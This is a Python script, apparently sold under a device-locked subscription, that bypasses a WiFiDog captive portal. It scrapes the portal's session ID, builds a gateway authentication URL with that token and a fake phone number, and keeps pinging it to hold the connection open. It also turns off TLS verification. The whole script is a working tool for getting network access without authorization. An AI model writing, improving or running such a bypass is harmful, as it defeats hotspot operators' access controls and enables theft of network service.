import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import datetime
import hashlib
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

AUTHORIZED_USERS = {
    "SUYE": "C75350ECE3FD",
}

EXPIRY_DATE = datetime.datetime(2026, 4, 20) 
TRACKER_FILE = ".sys_info_log"

# --- [NETWORK CONFIG] ---
PING_THREADS = 1
MIN_INTERVAL = 0.1
MAX_INTERVAL = 0.7

RED    = "\033[38;5;196m" 
GREEN  = "\033[38;5;46m"  
CYAN   = "\033[38;5;51m"  # Electric Blue
YELLOW = "\033[38;5;226m" 
PURPLE = "\033[38;5;141m" # Neon Purple
ORANGE = "\033[38;5;208m" 
WHITE  = "\033[38;5;255m" 
RESET  = "\033[0m"

stop_event = threading.Event()

def get_device_id():
    try:
        device_str = subprocess.check_output('getprop ro.serialno', shell=True).decode().strip()
        if not device_str: raise Exception
    except:
        try:
            import platform
            device_str = platform.node() + platform.machine() + platform.processor()
        except:
            device_str = "DEFAULT_STABLE_ID_001"
    return hashlib.sha256(device_str.encode()).hexdigest()[:12].upper()

def security_check():
    current_device_key = get_device_id()
    user_name = next((name for name, key in AUTHORIZED_USERS.items() if key == current_device_key), None)
            
    if not user_name:
        os.system('clear')
        print(f"{GREEN}╔══════════════════════════════════════════╗")
        print(f"║{CYAN}          TELEGRAM: @Su_Ye_21             {YELLOW}║")
        print(f"╚══════════════════════════════════════════╝{RESET}")
        print(f"{RED}╔══════════════════════════════════════════╗")
        print(f"║           ❌ ACCESS DENIED ❌            ║")
        print(f"╚══════════════════════════════════════════╝{RESET}")
        print(f"{YELLOW}[!] Device ID: {WHITE}{current_device_key}{RESET}")
        print(f"{WHITE}\nPlease contact Admin for access.{RESET}")
        sys.exit()

    try:
        response = requests.get("http://www.google.com", timeout=3)
        server_date_str = response.headers['date']
        current_time = datetime.datetime.strptime(server_date_str, '%a, %d %b %Y %H:%M:%S %Z')
    except:
        current_time = datetime.datetime.now()

    if os.path.exists(TRACKER_FILE):
        with open(TRACKER_FILE, "r") as f:
            try:
                last_run_time = datetime.datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                if current_time < last_run_time:
                    print(f"\n{RED}[!] Time Manipulation Detected!{RESET}")
                    sys.exit()
            except: pass

    with open(TRACKER_FILE, "w") as f:
        f.write(current_time.strftime('%Y-%m-%d %H:%M:%S'))

    if current_time > EXPIRY_DATE:
        print(f"\n{RED}[!] SUBSCRIPTION EXPIRED ON {EXPIRY_DATE.strftime('%Y-%m-%d')}{RESET}")
        sys.exit()
    return user_name

def check_internet():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
        return r.status_code == 204
    except: return False

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=2)
            print(f"{CYAN}[▶] {GREEN}Engine Active | Ping Stable...{RESET}", end="\r")
        except: break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    os.system('clear')
    authorized_name = security_check() 
    
    print(f"{GREEN}╔══════════════════════════════════════════╗")
    print(f"║{CYAN}          SUYE - TURBO ENGINE             {YELLOW}║")
    print(f"╚══════════════════════════════════════════╝{RESET}") 
    print(f"{WHITE}[▶] {YELLOW}User    : {WHITE}{authorized_name}{RESET}")
    print(f"{WHITE}[▶] {YELLOW}Status  : {GREEN}Authorized Verified{RESET}")
    print(f"{WHITE}[▶] {YELLOW}Expiry  : {CYAN}2026-04-20{RESET}")
    print(f"{WHITE}" + "━" * 44 + f"{RESET}")

    while True:
        stop_event.clear()
        session = requests.Session()
        
        if check_internet():
            print(f"{YELLOW}[•] System Monitoring Active...{RESET}", end="\r")
            time.sleep(10)
            continue

        print(f"\n{ORANGE}[!] Connection Lost. Re-linking...{RESET}")
        try:
            r0 = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            portal_url = r0.url
            
            r1 = session.get(portal_url, verify=False, timeout=5)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=5)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                print(f"{GREEN}[✓] Portal Captured: {sid[:10]}...{RESET}")
                parsed_portal = urlparse(portal_url)
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
                
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
                
                while True:
                    time.sleep(10) 
                    if not check_internet():
                        stop_event.set()
                        break
            else:
                time.sleep(3)
        except: time.sleep(2)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] Stopping Engine Safely...{RESET}")
        